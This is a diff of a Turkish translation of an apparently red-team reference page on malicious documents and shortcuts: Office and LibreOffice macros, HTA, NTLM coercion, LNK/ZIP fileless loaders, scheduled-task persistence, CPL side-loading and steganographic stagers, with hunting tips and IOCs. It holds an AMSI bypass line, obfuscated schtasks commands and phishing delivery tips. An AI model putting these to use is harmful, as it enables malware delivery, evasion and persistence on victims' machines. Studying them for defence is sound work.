@@ -4,11 +4,11 @@
 
 ## Office Belgeleri
 
-Microsoft Word, bir dosyayı açmadan önce dosya verilerini doğrular. Veri doğrulama, OfficeOpenXML standardına göre veri yapısının tanımlanması biçiminde gerçekleştirilir. Veri yapısı tanımlanırken herhangi bir hata oluşursa analiz edilen dosya açılmaz.
+Microsoft Word, bir dosyayı açmadan önce dosya verilerini doğrular. Veri doğrulama, OfficeOpenXML standardına göre veri yapısının tanımlanması şeklinde gerçekleştirilir. Veri yapısı tanımlanırken herhangi bir hata oluşursa analiz edilen dosya açılmaz.
 
-Makro içeren Word dosyaları genellikle `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve yine de makrolarının çalışmasını sağlamak mümkündür.\
-Örneğin, RTF dosyaları tasarımları gereği makroları desteklemez; ancak DOCM uzantısı RTF olarak değiştirilen bir dosya Microsoft Word tarafından işlenir ve makro çalıştırabilir.\
-Aynı dahili yapılar ve mekanizmalar Microsoft Office Suite'in tüm yazılımları (Excel, PowerPoint vb.) için geçerlidir.
+Genellikle macro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve yine de macro çalıştırma özelliklerini korumak mümkündür.\
+Örneğin, bir RTF dosyası tasarımı gereği macro desteklemez; ancak RTF olarak yeniden adlandırılan bir DOCM dosyası Microsoft Word tarafından işlenir ve macro çalıştırabilir.\
+Aynı dahili bileşenler ve mekanizmalar, Microsoft Office Suite'in tüm yazılımları için geçerlidir (Excel, PowerPoint vb.).
 
 Bazı Office programlarının hangi uzantıları çalıştıracağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
 
@@ -16,7 +16,7 @@ Bazı Office programlarının hangi uzantıları çalıştıracağını kontrol 
 assoc | findstr /i "word excel powerp"
 ```
 
-DOCX dosyaları, makro içeren uzak bir şablona (File –Options –Add-ins –Manage: Templates –Go) başvuruyorsa makroları da “çalıştırabilir”.
+DOCX dosyaları, makro içeren uzak bir şablona (File –Options –Add-ins –Manage: Templates –Go) başvurarak makroları da “çalıştırabilir”.
 
 ### Harici Görsel Yükleme
 
@@ -25,20 +25,20 @@ _**Categories**: Links and References, **Filed names**: includePicture ve **File
 
 ![Office Documents - Harici Görsel Yükleme: Şuraya gidin: Insert -- Quick Parts -- Field](<../../images/image (155).png>)
 
-Bir belge oluşturmak yerine alınmış bir belgeyi analiz etmek için bkz. [VBA makro analizi: gereksiz kod ve UserForm'lar](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).
+Bir belge oluşturmak yerine alınan bir belgeyi analiz etmek için bkz. [VBA makro analizi: anlamsız kod ve UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).
 
-### Makro Arka Kapısı
+### Makro Backdoor'u
 
 Belgeden rastgele kod çalıştırmak için makrolar kullanılabilir.
 
 #### Otomatik yükleme işlevleri
 
-Ne kadar yaygınlarsa, AV'nin bunları algılama olasılığı da o kadar yüksektir.
+Ne kadar yaygın kullanılırlarsa AV tarafından tespit edilme olasılıkları o kadar artar.
 
 - AutoOpen()
 - Document_Open()
 
-#### Makro Kod Örnekleri
+#### Makro kodu örnekleri
 
 ```vba
 Sub AutoOpen()
@@ -72,22 +72,22 @@ proc.Create "powershell <beacon line generated>
 
 #### Metadata'yı manuel olarak kaldırma
 
-**File > Info > Inspect Document > Inspect Document** yolunu izleyerek Document Inspector'ı açın. **Inspect**'e, ardından **Document Properties and Personal Information**'ın yanındaki **Remove All**'a tıklayın.
+Document Inspector'ı açmak için **File > Info > Inspect Document > Inspect Document** yolunu izleyin. **Inspect**'e, ardından **Document Properties and Personal Information**'ın yanındaki **Remove All**'a tıklayın.
 
 #### Doc uzantısı
 
-İşiniz bittiğinde **Save as type** açılır menüsünü seçin ve biçimi **`.docx`**'ten Word 97-2003 **`.doc`**'a değiştirin.\
-Bunu yapın, çünkü **`.docx` içine macro kaydedemezsiniz** ve macro etkin **`.docm`** uzantısının **kötü bir ünü** vardır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/e-posta ağ geçitleri bu dosyaları tamamen engeller). Bu nedenle, **eski `.doc` uzantısı en iyi uzlaşmadır**.
+İşiniz bittiğinde **Save as type** açılır menüsünü seçin ve biçimi **`.docx`**'ten Word 97-2003 **`.doc`** biçimine değiştirin.\
+Bunu yapın; çünkü **`.docx` içinde macro'ları kaydedemezsiniz** ve macro'ları etkinleştiren **`.docm`** uzantısının **damgalanması** söz konusudur (ör. küçük resim simgesinde kocaman bir `!` bulunur ve bazı web/e-posta gateway'leri bunları tamamen engeller). Bu nedenle, bu **eski `.doc` uzantısı en iyi uzlaşmadır**.
 
-#### Kötü Amaçlı Macro Oluşturucuları
+#### Malicious Macro Generator'ları
 
 - MacOS
   - [**macphish**](https://github.com/cldrn/macphish)
   - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## LibreOffice ODT otomatik çalıştırılan macro'ları (Basic)
+## LibreOffice ODT otomatik çalıştırma macro'ları (Basic)
 
-LibreOffice Writer belgelerine Basic macro'ları gömülebilir ve macro, **Open Document** olayına bağlanarak dosya açıldığında otomatik olarak çalıştırılabilir (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Basit bir reverse shell macro'su şöyledir:
+LibreOffice Writer belgelerine Basic macro'ları eklenebilir ve macro, **Open Document** etkinliğine bağlanarak dosya açıldığında otomatik olarak çalıştırılabilir (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Basit bir reverse shell macro'su şöyle görünür:
 
 ```vb
 Sub Shell
@@ -95,18 +95,18 @@ Sub Shell
 End Sub
 ```
 
-Dize içindeki çift tırnaklara (`""`) dikkat edin: LibreOffice Basic, gerçek tırnakları kaçırmak için bunları kullanır; bu nedenle `...==""")` ile biten payload'larda hem iç komut hem de Shell argümanı dengeli kalır.
+Not: Dizgedeki çift tırnaklara (`""`) dikkat edin: LibreOffice Basic, gerçek tırnak işaretlerini kaçırmak için bunları kullanır. Bu nedenle `...==""")` ile biten payload’larda hem iç komut hem de Shell argümanı dengeli kalır.
 
 Teslimat ipuçları:
 
-- `.odt` olarak kaydedin ve açıldığında hemen çalışması için makroyu belge olayına bağlayın.
-- `swaks` ile e-posta gönderirken `--attach @resume.odt` kullanın (`@` gereklidir; böylece ek olarak dosya adı metni değil, dosyanın baytları gönderilir). Bu, doğrulama yapmadan rastgele `RCPT TO` alıcılarını kabul eden SMTP sunucularını kötüye kullanırken kritik önem taşır.
+- Dosyayı `.odt` olarak kaydedin ve açıldığında hemen çalışması için makroyu belge olayına bağlayın.
+- `swaks` ile e-posta gönderirken `--attach @resume.odt` kullanın (`@` işareti, dosya adı metninin değil dosya baytlarının ek olarak gönderilmesi için gereklidir). Bu, doğrulama yapmadan rastgele `RCPT TO` alıcılarını kabul eden SMTP sunucularını kötüye kullanırken kritik önem taşır.
 
 ## HTA Dosyaları
 
-HTA, **HTML ile betik dillerini (VBScript ve JScript gibi) birleştiren** bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve tarayıcının güvenlik modelindeki kısıtlamalar olmadan "tam güvenilir" bir uygulama olarak çalışır.
+HTA, **HTML ile betik dillerini (VBScript ve JScript gibi) birleştiren** bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve bir tarayıcının güvenlik modelindeki kısıtlamalara tabi olmadan, "tamamen güvenilen" bir uygulama olarak çalışır.
 
-HTA, **`mshta.exe`** kullanılarak çalıştırılır. Bu dosya genellikle **Internet Explorer ile birlikte yüklenir**; dolayısıyla **`mshta`, IE'ye bağlıdır**. Bu nedenle IE kaldırılmışsa HTA'lar çalıştırılamaz.
+HTA, genellikle **Internet Explorer ile birlikte yüklenen** **`mshta.exe`** kullanılarak çalıştırılır; bu nedenle **`mshta`, IE'ye bağımlıdır**. Dolayısıyla IE kaldırılmışsa HTA'lar çalıştırılamaz.
 
 ```html
 <--! Basic HTA Execution -->
@@ -165,15 +165,15 @@ HTA, **`mshta.exe`** kullanılarak çalıştırılır. Bu dosya genellikle **Int
 
 ## HTML e-postada sahte ek kartları
 
-Bir HTML e-posta, gerçek bir ek içermek yerine sağlayıcının yerel ek önizleme kartını taklit edebilir. Talos, dört Base64 kodlu satır içi PNG MIME parçasından yeniden oluşturulmuş bir Gmail kartı gözlemledi. Görselin tamamı tek bir bağlantı etiketi içine alınmıştı ve `?m=<target-id>` içindeki alıcı değeri, alıcı bazında izlemeyi sağlıyordu. Bağlantı `http://` veya `https://` yerine `//` ile başlıyordu; tarayıcılar protokole göreceli bu biçimi çözümler, ancak yalnızca tam URL'lerle eşleşen URL çıkarıcılar bunu gözden kaçırabilir.<sup>[[11]](#references)</sup>
+Bir HTML e-posta, gerçek bir ek içermek yerine sağlayıcının yerel ek önizleme kartını taklit edebilir. Talos, dört Base64 kodlu satır içi PNG MIME parçasından yeniden oluşturulmuş bir Gmail kartı gözlemledi. Görselin tamamı tek bir anchor içine yerleştirilmişti ve `?m=<target-id>` içindeki alıcı değeri, alıcı başına izlemeyi mümkün kılıyordu. Bağlantı `http://` veya `https://` yerine `//` ile başlıyordu; tarayıcılar bu protokole göreli biçimi çözümler, ancak yalnızca tam nitelikli URL'lerle eşleşen URL çıkarıcıları bunu gözden kaçırabilir.<sup>[[11]](#references)</sup>
 
-Analiz sırasında, oluşturulmuş ek listesine güvenmek yerine ham MIME'ı inceleyin. Satır içi görüntü parçalarının görsel kartı nasıl oluşturduğunu yeniden kurun, kartı çevreleyen bağlantı etiketini belirleyin ve URL'leri çıkarmadan önce protokole göreceli `href` değerlerini normalleştirin.<sup>[[11]](#references)</sup>
+Analiz sırasında, görüntülenen ek listesine güvenmek yerine ham MIME'ı inceleyin. Satır içi görsel parçalarının görsel kartı nasıl oluşturduğunu yeniden kurun, kartı çevreleyen anchor'ı belirleyin ve URL'leri çıkarmadan önce protokole göreli `href` değerlerini normalize edin.<sup>[[11]](#references)</sup>
 
-Zarf/başlık gönderen sahteciliği ve DMARC hizalama testleri için bkz. [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).
+Zarf/başlık göndereni sahteciliği ve DMARC hizalama testi için bkz. [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).
 
 ## NTLM Kimlik Doğrulamasını Zorlama
 
-**NTLM kimlik doğrulamasını "uzaktan" zorlamanın** birkaç yolu vardır; örneğin, e-postalara veya kullanıcının erişeceği HTML'e **görünmez görüntüler** ekleyebilirsiniz (HTTP MitM bile olabilir?). Ya da kurbanına, yalnızca **klasörü açarak** kimlik doğrulamayı **tetikleyecek** dosyaların **adresini** gönderebilirsiniz.
+NTLM kimlik doğrulamasını **"uzaktan" zorlamanın** birkaç yolu vardır. Örneğin, kullanıcının erişeceği e-postalara veya HTML'ye **görünmez görseller** ekleyebilirsiniz (HTTP MitM yoluyla bile?). Ya da kurbanı, yalnızca **klasörü açarak** **kimlik doğrulamayı** **tetikleyecek** dosya **adreslerine** yönlendirebilirsiniz.
 
 **Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**
 
@@ -189,22 +189,34 @@ Zarf/başlık gönderen sahteciliği ve DMARC hizalama testleri için bkz. [SMTP
 
 ### NTLM Relay
 
-Yalnızca hash'i veya kimlik doğrulama bilgilerini çalmakla kalmayıp **NTLM relay saldırıları da gerçekleştirebileceğinizi** unutmayın:
+Yalnızca hash'i veya kimlik doğrulamayı çalmakla kalmayıp **NTLM relay saldırıları da gerçekleştirebileceğinizi** unutmayın:
 
-- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+- [**NTLM Relay saldırıları**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+- [**AD CS ESC8 (sertifikalara NTLM relay)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
-## LNK Loader'ları + ZIP İçine Gömülü Payload'lar (fileless zincir)
+## LNK ile `ftp.exe` yerel komut hazırlama
 
-Son derece etkili kampanyalar, iki meşru yanıltıcı belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren ZIP dosyası gönderir. Buradaki numara, gerçek PowerShell loader'ının ZIP'in ham baytlarında benzersiz bir işaretleyiciden sonra saklanması ve .lnk dosyasının bu içeriği çıkarıp tamamen bellekte çalıştırmasıdır.<sup>[[2]](#references)</sup>
+Bir kısayol, görsel uzantısıyla gizlenmiş bir metin komut dosyasını kullanarak `ftp.exe -s:icon.ico` başlatabilir.<sup>[[12]](#references)</sup> `-s:` seçeneği yerel FTP komutlarını okur; Windows 8 ve sonraki sürümlerde bu dosyanın UTF-8 kodlu olması gerekir.<sup>[[13]](#references)</sup> `!` ile başlayan bir satır, komutu FTP sunucusuna göndermeden `cmd /c` aracılığıyla yerel bir komut çalıştırır. Bu yerel çalıştırma yolu için FTP bağlantısı gerekmez.<sup>[[14]](#references)</sup> Bildirilen zincirde FTP betiği ikinci bir komut dosyasına ulaşıyordu. `!` satırının tamamı önemlidir: yalnızca `!more res.ico` dosyayı görüntülerken `cmd`'ye aktarılan bir pipe, dosyanın içeriğini çalıştırır.<sup>[[12]](#references)[[14]](#references)</sup>
 
-.lnk PowerShell tek satırlık komutunun uyguladığı tipik akış:
+Aynı zincirde, her güncelleme için yeni bir yürütülebilir dosya yüklemek yerine yazılabilir bir komut dosyasını yeniden okuyan yinelenen bir görev kullanıldı. Görev eylemi `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd` şeklindeydi; dosyada çalıştırıldığında talimatları alan bir komut bulunuyordu. İlgili bir varyantta, zamanlanmış çalıştırmadan önce yeni bir komut dosyası indiriliyordu. Görev çalıştığında dosya mevcut ve okunabilir olmalıdır; `conhost`, görevi yapılandırılmış kullanıcı belirtecinin ötesinde yetkilerle çalıştırmaz.<sup>[[12]](#references)</sup> Görev mekanizmaları için bkz. [zamanlanmış görev yürütme](../../windows-hardening/lateral-movement/atexec.md).
+
+## Gizli MSI ve yem belge içeren VHDX kısayolu
+
+Bağlanmış bir VHDX, aynı birimdeki bir MSI ve yem elektronik tablosunu gizlerken görünür bir LNK gösterebilir. Bildirilen zincirde LNK, `cmd.exe /c Visa_Details.msi & Attachment-2.xls` komutunu kullanıyordu. `&` ayıracı, yükleyici komutu başarısız olsa bile yem belgeyi açar; belgenin açılması, yüklemenin başarıyla tamamlandığının kanıtı değildir. Bu, [MSI özel eylem yürütme](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md) yönteminin bir dağıtım çeşididir; tek başına MSI yetki yükseltmesi değildir.<sup>[[12]](#references)</sup>
+
+Bu MSI için `CustomAction.Type` **194**, `Binary` tablosunda saklanan bir EXE'yi (**2**), dönüş kodunu yok sayma (**64**) ve asenkron (**128**) bayraklarıyla birleştirir. **64 + 128** birleşimi, Windows Installer'ın EXE'nin tamamlanmasını beklememesi anlamına gelir; yalnızca 128 bayrağı kullanılsaydı sıralamanın sonunda beklerdi.<sup>[[15]](#references)[[16]](#references)</sup> Yürütmeyi gömülü EXE'ye bağlamadan önce eylemin `Source` değerini `Binary` tablosuyla ve eylemin `InstallExecuteSequence` içindeki konumuyla karşılaştırın.<sup>[[12]](#references)[[15]](#references)</sup> [WebDAV UNC yolu uzak bir MSI dağıtabilir](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), ancak bu farklı bir giriş noktasıdır.
+
+## LNK Loader'ları + ZIP içine gömülü Payload'lar (fileless zincir)
+
+Etkili kampanyalar, iki meşru yem belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP dağıtır. Buradaki yöntem, asıl PowerShell loader'ının benzersiz bir işaretçiden sonraki ZIP ham baytlarında saklanması ve .lnk'nin bu içeriği çıkarıp tamamen bellekte çalıştırmasıdır.<sup>[[2]](#references)</sup>
+
+.lnk PowerShell one-liner'ının tipik akışı:
 
 1) Özgün ZIP'i yaygın konumlarda bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve geçerli çalışma dizininin üst dizini.
-2) ZIP'in baytlarını okuyun ve sabit kodlanmış bir işaretleyici bulun (ör. xFIQCV). İşaretleyiciden sonraki her şey gömülü PowerShell payload'ıdır.
-3) ZIP'i %ProgramData% konumuna kopyalayın, oraya çıkarın ve meşru görünmesi için yanıltıcı .docx dosyasını açın.
-4) Geçerli işlem için AMSI'yi atlatın: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
-5) Sonraki aşamanın gizlemesini kaldırın (ör. tüm # karakterlerini kaldırarak) ve onu bellekte çalıştırın.
+2) ZIP baytlarını okuyun ve sabit kodlanmış bir işaretçi (ör. xFIQCV) bulun. İşaretçiden sonraki her şey gömülü PowerShell payload'ıdır.
+3) ZIP'i %ProgramData% konumuna kopyalayın, oraya çıkarın ve meşru görünmek için yem .docx dosyasını açın.
+4) Geçerli süreç için AMSI'yi atlatın: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+5) Sonraki aşamanın gizlemesini kaldırın (ör. tüm # karakterlerini silin) ve bellekte çalıştırın.
 
 Gömülü aşamayı çıkarıp çalıştırmak için örnek PowerShell iskeleti:
 
@@ -226,34 +238,34 @@ Invoke-Expression $code
 ```
 
 Notlar
-- Teslimat çoğu zaman saygın PaaS alt alan adlarını (örn. *.herokuapp.com) kötüye kullanır ve payload'ları koşula bağlayabilir (IP/UA'ya göre zararsız ZIP'ler sunar).
-- Sonraki aşama, disk üzerindeki izleri en aza indirmek için sıklıkla base64/XOR shellcode'u çözer ve Reflection.Emit + VirtualAlloc aracılığıyla çalıştırır.
+- Delivery çoğu zaman güvenilir PaaS alt alan adlarını (örn. *.herokuapp.com) kötüye kullanır ve payload'ları koşullara bağlayabilir (IP/UA'ya göre zararsız ZIP'ler sunar).
+- Sonraki aşama, genellikle base64/XOR shellcode'u çözer ve disk üzerindeki izleri en aza indirmek için bunu Reflection.Emit + VirtualAlloc ile çalıştırır.
 
-Aynı zincirde kullanılan kalıcılık
-- Microsoft Web Browser denetiminin COM TypeLib hijacking yöntemiyle ele geçirilmesi; böylece IE/Explorer veya bu denetimi gömen herhangi bir uygulama payload'u otomatik olarak yeniden başlatır.<sup>[[2]](#references)[[4]](#references)</sup> Ayrıntılar ve kullanıma hazır komutlar için buraya bakın:
+Aynı zincirde kullanılan persistence
+- Microsoft Web Browser control'ünün COM TypeLib hijacking yöntemiyle ele geçirilmesi; böylece IE/Explorer veya bu denetimi gömen herhangi bir uygulama payload'u otomatik olarak yeniden başlatır.<sup>[[2]](#references)[[4]](#references)</sup> Ayrıntılar ve kullanıma hazır komutlar için:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
-Avcılık/IOC'ler
-- Arşiv verisinin sonuna eklenmiş ASCII işaret dizgesini (örn. xFIQCV) içeren ZIP dosyaları.
+Hunting/IOC'ler
+- Arşiv verisinin sonuna eklenmiş ASCII işaretçi dizesi (örn. xFIQCV) içeren ZIP dosyaları.
 - ZIP dosyasını bulmak için üst/ kullanıcı klasörlerini tarayan ve bir yem belge açan .lnk.
-- [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla AMSI'ye müdahale.
-- Güvenilir PaaS alan adlarında barındırılan bağlantılarla sonlanan uzun iş yazışmaları.
+- [System.Management.Automation.AmsiUtils]::amsiInitFailed üzerinden AMSI kurcalaması.
+- Güvenilir PaaS alan adlarında barındırılan bağlantılarla sona eren, uzun süredir devam eden iş yazışmaları.
 
-## LNK önce yem belgeyi açarak aşamalandırma → scheduled-task kalıcılığı → güvenilir CPL side-loading
+## LNK ile önce decoy gösterme → scheduled-task persistence → güvenilir CPL side-loading
 
-Tekrarlanan başka bir örüntü, arka planda gerçek zinciri aşamalandırırken zararsız bir yem belgeyi hemen açan **belgeyi taklit eden bir `.lnk`** dosyasıdır.<sup>[[3]](#references)</sup>
+Tekrarlanan bir başka örüntü, arka planda gerçek zinciri hazırlarken zararsız bir yem belgeyi hemen açan, **belge gibi görünen bir `.lnk`** dosyasıdır.<sup>[[3]](#references)</sup>
 
 Gözlemlenen iş akışı:
-1. Kısayol **PDF gibi görünür** ve gizlenmiş bir PowerShell indiricisini başlatmak için `conhost.exe` veya benzer bir proxy kullanır.
-2. PowerShell, belirgin belirteçleri (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) parçalara ayırır; böylece `iwr`, `gci`, `ren`, `cpi` veya `schtasks` arayan basit tespit mekanizmaları komutu gözden kaçırır.
-3. Aşamalandırıcı önce **yem belgeyi indirir**, kurban için açar ve ardından arka planda kötü amaçlı dosyaları yeniden oluşturur.
-4. Payload'lar **uydurma uzantılarla** yazılabilir ve daha sonra dolgu karakterleri kaldırılarak yeniden adlandırılabilir; bu da belirgin `.exe` / `.cpl` dosyalarının ortaya çıkışını geciktirir.
-5. Kullanıcının yazabildiği bir yoldan güvenilir bir ana bilgisayar ikilisini başlatan **dakika bazlı bir scheduled task** ile kalıcılık sağlanır.
+1. Kısayol **PDF gibi görünür** ve gizlenmiş bir PowerShell downloader'ı başlatmak için `conhost.exe` veya benzer bir proxy kullanır.
+2. PowerShell, belirgin token'ları parçalara ayırır (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`); böylece `iwr`, `gci`, `ren`, `cpi` veya `schtasks` arayan basit tespitler komutu kaçırır.
+3. Stager önce **yem belgeyi indirir**, kurbanın açması için belgeyi görüntüler ve ardından arka planda zararlı dosyaları yeniden oluşturur.
+4. Payload'lar **anlamsız uzantılarla** yazılabilir ve ardından dolgu karakterleri kaldırılarak yeniden adlandırılabilir; böylece bariz `.exe` / `.cpl` izlerinin ortaya çıkması geciktirilir.
+5. Persistence, kullanıcı tarafından yazılabilir bir konumdaki güvenilir bir host binary'yi başlatan **dakika bazlı bir scheduled task** ile sağlanır.
 
-Bu örüntüye dair temel avcılık ipuçları:
+Bu örüntüden çıkarılabilecek temel hunting ipuçları:
 
 ```powershell
 # Suspicious split-token PowerShell seen in LNK chains
@@ -262,25 +274,25 @@ r''e''n
 &(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
 ```
 
-Tanınması faydalı bir hazırlık düzeni:
+Tanımaya değer bir staging düzeni:
 - `C:\Users\Public\<decoy>.pdf`
 - `C:\Users\Public\<trusted>.exe`
-- `C:\Users\Public\<malicious>.cpl` or `.dll`
+- `C:\Users\Public\<malicious>.cpl` veya `.dll`
 - `C:\Windows\Tasks\<blob>.dat`
 
-### İkinci aşama neden gizlidir?
+### İkinci aşama neden gizlidir
 
-Rapid7 vaka çalışmasında, zamanlanmış görev **`Fondue.exe`** dosyasını tekrar tekrar `C:\Users\Public\` konumundan başlatıyordu. **`APPWIZ.cpl`** dosyası yanına bırakılıp **`RunFODW`** dışa aktarıldığından, güvenilir Microsoft binary’si meşru sistem kopyası yerine saldırganın CPL dosyasını side-load etti.
+Rapid7 vaka incelemesinde, zamanlanmış görev **`Fondue.exe`** dosyasını tekrar tekrar `C:\Users\Public\` konumundan başlatıyordu. **`APPWIZ.cpl`** dosyası bunun yanına yerleştirilip **`RunFODW`** dışa aktarıldığı için, güvenilir Microsoft binary’si meşru sistem kopyası yerine saldırganın CPL dosyasını side-load ediyordu.
 
-CPL dosyası:
+CPL daha sonra:
 - `C:\Windows\Tasks\editor.dat` konumundaki bir **AES-256-CBC** blob’unu okur
-- Blob’un şifresini **Windows CNG / `bcrypt.dll`** aracılığıyla çözer
-- Yürütülebilir bellek ayırıp şifresi çözülmüş shellcode’u kopyalar
-- Shellcode işaretçisini **`EnumUILanguagesW`** için callback olarak geçirerek dolaylı biçimde çalıştırır
+- **Windows CNG / `bcrypt.dll`** aracılığıyla şifresini çözer
+- Çalıştırılabilir bellek ayırır ve çözülen shellcode’u buraya kopyalar
+- Shellcode pointer’ını **`EnumUILanguagesW`** için callback olarak ileterek onu dolaylı biçimde çalıştırır
 
-Bu son adım ayrıca araştırılmaya değer: malware, doğrudan `((void(*)())buf)()` atlamasından kaçınmak için yürütme akışını aktarmada sıklıkla **callback alan meşru bir WinAPI**'yi kötüye kullanır.
+Son adım ayrıca araştırılmaya değer: malware, yürütmeyi devretmek için çoğu zaman doğrudan `((void(*)())buf)()` atlamasından kaçınır ve bunun yerine **callback alan meşru bir WinAPI** işlevini kötüye kullanır.
 
-Bu kampanyadaki şifresi çözülmüş payload, **Donut** shellcode’uydu. Bu shellcode daha sonra son PE’yi tamamen belleğe eşledi ve yürütmeyi devretmeden önce mevcut process’te **AMSI/WLDP/ETW**'yi patch’ledi. Side-loading ve bellekte çalışan post-processing hakkında ayrıntılı notlar için:
+Bu kampanyadaki çözülen payload, son PE’yi tamamen belleğe eşleyen ve yürütmeyi devretmeden önce mevcut process içinde **AMSI/WLDP/ETW**’yi patch’leyen **Donut** shellcode’uydu. Side-loading ve bellekte kalan post-processing hakkında daha ayrıntılı notlar için:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
@@ -290,30 +302,30 @@ Bu kampanyadaki şifresi çözülmüş payload, **Donut** shellcode’uydu. Bu s
 ../../windows-hardening/av-bypass.md
 {{#endref}}
 
-Araştırma için pratik ipuçları:
-- `.lnk` dosyasının `powershell.exe` veya `conhost.exe` başlatmasının ardından görünür bir decoy belgesinin açılması.
-- `C:\Users\Public\` konumuna yapılan kısa süreli indirmelerin ardından anlamsız uzantılardan hemen yeniden adlandırma yapılması.
+Pratik inceleme ipuçları:
+- Ardından görünür bir decoy belgesi açan `.lnk` dosyasının `powershell.exe` veya `conhost.exe` başlatması.
+- **`C:\Users\Public\`** konumuna kısa süreli indirmeler yapılmasının ardından dosyaların anlamsız uzantılardan hemen yeniden adlandırılması.
 - `GoogleErrorReport` gibi sıradan adlara sahip zamanlanmış görevlerin **kullanıcının yazabildiği dizinlerden** çalıştırılması.
 - Güvenilir binary’lerin aynı sistem dışı dizindeki **`.cpl` / `.dll`** dosyalarını yüklemesi.
-- `C:\Windows\Tasks\` altına yazılan ve ardından side-load edilmiş modül tarafından okunan Base64 metin blob’ları.
+- **`C:\Windows\Tasks\`** altına Base64 metin blob’ları yazılması ve bunların ardından side-load edilmiş modül tarafından okunması.
 
-## Görsellerde steganografiyle ayrılmış payload’lar (PowerShell stager)
+## Görüntülerde steganografiyle sınırlandırılmış payload’lar (PowerShell stager)
 
-Güncel loader zincirleri, Base64 PowerShell stager’ını çözüp çalıştıran gizlenmiş bir JavaScript/VBS dosyası sunar. Bu stager, düz metin olarak benzersiz başlangıç/bitiş işaretçileri arasına gizlenmiş Base64 kodlu bir .NET DLL içeren bir görseli (çoğunlukla GIF) indirir. Script, bu ayırıcıları arar (gerçek saldırılarda görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki metni çıkarır, Base64’ten byte’lara dönüştürür, assembly’yi belleğe yükler ve bilinen bir giriş metodunu C2 URL’siyle çağırır.<sup>[[5]](#references)</sup>
+Güncel loader zincirleri, Base64 PowerShell stager’ını çözüp çalıştıran, obfuscate edilmiş JavaScript/VBS gönderir. Bu stager, düz metin olarak benzersiz başlangıç/bitiş işaretleyicileri arasına gizlenmiş Base64 kodlu bir .NET DLL içeren görüntüyü (çoğunlukla GIF) indirir. Script bu ayraçları arar (gerçek saldırılarda görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki metni çıkarır, byte’lara Base64 decode eder, assembly’yi belleğe yükler ve bilinen bir giriş metodunu C2 URL’siyle çağırır.<sup>[[5]](#references)</sup>
 
 İş Akışı
-- Aşama 1: Arşivlenmiş JS/VBS dropper → içine gömülü Base64’ü çözer → `-nop -w hidden -ep bypass` parametreleriyle PowerShell stager’ını başlatır.
-- Aşama 2: PowerShell stager → görseli indirir, işaretçilerle ayrılmış Base64’ü çıkarır, .NET DLL’yi belleğe yükler ve metodunu (ör. VAI) C2 URL’si ile seçenekleri ileterek çağırır.
-- Aşama 3: Loader son payload’ı alır ve genellikle process hollowing kullanarak güvenilir bir binary’ye (yaygın olarak MSBuild.exe) inject eder.<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing ve güvenilir yardımcı programlar üzerinden proxy yürütme hakkında daha fazla bilgi için:
+- Aşama 1: Arşivlenmiş JS/VBS dropper → gömülü Base64’ü çözer → `-nop -w hidden -ep bypass` parametreleriyle PowerShell stager’ını başlatır.
+- Aşama 2: PowerShell stager’ı → görüntüyü indirir, işaretleyicilerle sınırlandırılmış Base64’ü çıkarır, .NET DLL’ini belleğe yükler ve metodunu (ör. VAI) C2 URL’si ile seçenekleri ileterek çağırır.
+- Aşama 3: Loader son payload’ı alır ve genellikle process hollowing yoluyla güvenilir bir binary’ye (yaygın olarak MSBuild.exe) inject eder.<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing ve güvenilir yardımcı program proxy execution hakkında daha fazla bilgi için:
 
 {{#ref}}
 ../../reversing/common-api-used-in-malware.md
 {{#endref}}
 
-Bir görselden DLL çıkarıp .NET metodunu bellekte çağırmaya yönelik PowerShell örneği:
+Bir görüntüden DLL’i çıkarıp bellekteki .NET metodunu çağırmaya yönelik PowerShell örneği:
 
 <details>
